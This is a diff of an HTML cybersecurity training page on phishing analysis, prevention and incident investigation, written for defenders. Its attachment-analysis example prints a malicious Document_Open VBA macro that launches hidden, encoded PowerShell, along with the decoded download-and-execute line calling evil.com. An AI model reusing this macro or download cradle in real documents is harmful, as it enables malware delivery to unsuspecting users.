@@ -1,22 +1,76 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
 <h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Module 5: Phishing Analysis</h6>
 
-<h6 class="text-danger mt-3">Sub-Domains / Rooms</h6>
-<ul style="color:#c0d0e0;">
-  <li><b>Phishing Analysis</b> — Analyze email headers (SPF, DKIM, DMARC), inspect URLs safely, extract and analyze attachments.</li>
-  <li><b>Phishing Prevention</b> — Deploy email filtering rules, user awareness training, DMARC enforcement, and reporting mechanisms.</li>
-  <li><b>Real-Phish Investigations</b> — Investigate real-world phishing campaigns, trace attacker infrastructure, and identify compromised accounts.</li>
-</ul>
+<p style="color:#c0d0e0;">Phishing is the #1 initial access vector in breaches (Verizon DBIR 2025: 36% of breaches involve phishing). This module teaches you to analyze, prevent, and investigate phishing campaigns.</p>
 
+<h6 class="text-danger mt-3">Sub-Domains / Rooms</h6>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Phishing Analysis</p>
+<p style="color:#c0d0e0;">When analyzing a suspicious email, follow this structured approach:</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example Analysis:</b> An analyst receives a reported phishing email claiming to be from "security@paypa1.com". Header analysis shows: SPF=fail (sending IP 185.130.5.201 not authorized), DKIM=fail (signature mismatch), DMARC=fail (p=reject). The URL hxxps://paypa1.com/login resolves to 45.33.32.156 hosted in Russia. The attachment "Invoice.docm" contains a malicious VBA macro that downloads a PowerShell payload. The analyst blocks the domain, IP, and file hash, and sends a company-wide warning.
+<b>Complete Phishing Analysis Workflow:</b><br><br>
+<b>Step 1 — Header Analysis:</b><br>
+<code>From: security@paypa1.com (note: "paypa1" not "paypal")<br>
+Reply-To: attacker@protonmail.com<br>
+Return-Path: bounce@evil-phish.com<br>
+Received-SPF: fail (IP 185.130.5.201 not authorized for paypal.com)<br>
+DKIM: fail (signature did not verify)<br>
+DMARC: fail (p=reject, domain alignment failed)<br>
+Received: from mail.evil-server.com (185.130.5.201)</code><br><br>
+<b>Step 2 — URL Analysis:</b><br>
+The email contains: <code>&lt;a href="hxxps://bit.ly/3xK9mN2"&gt;Click to Verify Account&lt;/a&gt;</code><br>
+- Hover over link: Shows bit.ly URL (shortened = suspicious)<br>
+- Submit to URLScan.io: Redirect chain → bit.ly → 185.130.5.201/fake-paypal/login.php<br>
+- Final page: Cloned PayPal login page, HTML source shows form POST to <code>send.php</code><br>
+- Domain age: paypa1.com registered 2 days ago, privacy protection enabled<br><br>
+<b>Step 3 — Attachment Analysis:</b><br>
+The email has an attachment: <code>Invoice_2026.docm</code><br>
+- Extract metadata: Author="Microsoft User" (default), last saved by "Hacker"<br>
+- Static analysis with olevba: Finds VBA macro at stream M 7<br>
+<code>Private Sub Document_Open()<br>
+  Set obj = CreateObject("Wscript.Shell")<br>
+  obj.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAKAA=='<br>
+End Sub</code><br>
+- Decode Base64: <code>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</code><br>
+- Dynamic sandbox: Document opens, PowerShell runs, downloads AgentTesla malware, establishes C2<br><br>
+<b>Step 4 — Conclusion & Reporting:</b><br>
+- Type: Targeted phishing campaign with malicious macro-enabled document<br>
+- Payload: AgentTesla info-stealer<br>
+- C2: 185.130.5.201:443<br>
+- IOCs: paypa1.com, 185.130.5.201, invoice_hash.docm, evil.com/payload.ps1<br>
+- Actions: Block all IOCs, delete email from all inboxes, alert employees
 </div>
 
-<h6 class="text-danger mt-3">Key Skills Learned</h6>
-<ul style="color:#c0d0e0;">
-  <li>Email header analysis (SPF, DKIM, DMARC)</li>
-  <li>Safe URL and attachment analysis</li>
-  <li>Phishing kit identification</li>
-  <li>Incident response for phishing campaigns</li>
-</ul>
+<p style="color:#00d4ff;font-weight:600;">🔹 Phishing Prevention</p>
+<p style="color:#c0d0e0;">Prevention is better than cure. Implement these technical controls and user training programs.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Technical Controls:</b><br>
+1. <b>SPF/DKIM/DMARC:</b> Configure strict DMARC rejection (p=reject) to prevent domain spoofing<br>
+2. <b>Email Gateway:</b> Deploy Proofpoint, Mimecast, or Microsoft Defender for Office 365 — scans all inbound/outbound email<br>
+3. <b>URL Sandboxing:</b> Rewrite all URLs in emails, check reputation in real-time before allowing clicks<br>
+4. <b>Attachment Sandboxing:</b> Detonate all Office documents, PDFs, and archives in a sandbox before delivery<br>
+5. <b>DMARC Reporting:</b> Monitor DMARC aggregate reports to detect spoofing attempts<br><br>
+<b>User Training Program:</b><br>
+- <b>Monthly simulated phishing:</b> Send fake phishing emails to employees, track who clicks<br>
+- <b>Reporting button:</b> One-click Outlook plugin to report suspicious emails<br>
+- <b>Training modules:</b> Annual mandatory security awareness training<br>
+- <b>Reward program:</b> Gift cards for employees who report real phishing emails<br><br>
+<b>Metrics — Before vs After Training Program:</b><br>
+Before: 35% click rate → After 6 months: 8% click rate → After 12 months: 3% click rate<br>
+Report rate: 2% → 45% of suspicious emails reported before incident occurs
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Real-Phish Investigations</p>
+<p style="color:#c0d0e0;">Investigate real-world phishing campaigns to understand attacker infrastructure and identify compromised accounts.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Real Phishing Investigation Case:</b><br>
+<b>Situation:</b> 15 employees report receiving a fake DocuSign email. 3 employees entered their credentials.<br><br>
+<b>Investigation:</b><br>
+1. <b>Email analysis:</b> Headers show all emails from same infrastructure (IP 45.33.32.0/24), same phishing kit (same HTML structure, same exfiltration endpoint)<br>
+2. <b>Domain analysis:</b> docusign-verify[.]com registered 3 days ago, hosted on bulletproof hosting in Russia<br>
+3. <b>Phishing kit analysis:</b> Downloaded from the compromised server. Kit exfiltrates credentials to attacker@protonmail.com and stores them in /admin/logs.txt<br>
+4. <b>Impact assessment:</b> 3 users entered credentials. Check O365 sign-in logs: attacker accessed 2 mailboxes from IP 185.220.101.x at 03:00 UTC. Attacker searched for "password", "bank", "wire" in emails. No wire transfers occurred (financial team caught it).<br>
+5. <b>Remediation:</b> Reset 3 user passwords, revoke O365 sessions, enable MFA, block attacker IPs and domain at firewall, take down phishing site via hosting provider abuse contact, report to law enforcement<br>
+6. <b>Lessons learned:</b> Users didn't recognize "docusign-verify" as fake. Add domain similarity checks to email gateway. Increase phishing simulation frequency from monthly to bi-weekly.
+</div>
 </div>
